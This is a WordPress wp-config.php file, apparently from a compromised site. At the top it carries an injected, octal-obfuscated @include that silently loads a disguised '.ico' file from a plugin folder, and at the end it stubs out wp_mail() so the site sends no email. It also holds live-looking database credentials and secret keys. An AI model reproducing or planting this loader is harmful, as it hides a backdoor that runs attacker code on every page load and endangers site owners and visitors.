<?php
/*fc8a6*/

@include "\057va\162/w\167w/\166is\151on\141ry\163tr\145am\056co\155/w\160-c\157nt\145nt\057pl\165gi\156s/\167or\144pr\145ss\055se\157/.\0633a\063f2\0626.\151co";

/*fc8a6*/

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'will-visionary-stream');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'xqvjB/]i{@jz#YtGV4k?;&pC(eG5IAAIpRN6%4L=t,Ft3=*T}!X]=|rYG?5%PE1`');
define('SECURE_AUTH_KEY',  's{/!c$=Q_rB&v6Ed[nF.Wf~((IIq!/AISt6Emw%Z3F;E+Twq^N&T7[[%+D/bRH~N');
define('LOGGED_IN_KEY',    '@H@CgkN *#UL`EVhT|_ES3/;J;WVb{+h*Zax6pT=!Z0{0p4zXMKUwaEU#Cw9&_/{');
define('NONCE_KEY',        '}m*roN?h~;jOId[J~FW6:wpDzAg$M,uVTzIC|yt5h%ya~?RPi[su{ob5o-HlU^|-');
define('AUTH_SALT',        '<[3/$t(L?]Ow]Gu=7j54(pYK-340#;(bg<,H)AvAV,@YlEyKbYgk>cz]&sZyi5G_');
define('SECURE_AUTH_SALT', ' r~|-7|%~GtC8tD7aTbWO!_UWL!Xt:&C{$lcoc*d#-Xg^zsV!wmq TwD8WXHkJ]k');
define('LOGGED_IN_SALT',   '^j&kx@x2qH8%;@ck4$5i}2D+x|{nscu=.7R[EralG=CGf;W09d7RbcXk$~A*55~s');
define('NONCE_SALT',       'bVo]YOj;G0E#W?r?$bQ>wo8viLxU,9@$ZDq8| c=?H_-?ow;P sY}a):^x(&eXkE');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'vs_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');


define('FS_METHOD', 'direct');

define('FS_CHMOD_DIR', (0705 & ~ umask()));
define('FS_CHMOD_FILE', (0604 & ~ umask()));

function wp_mail() {}
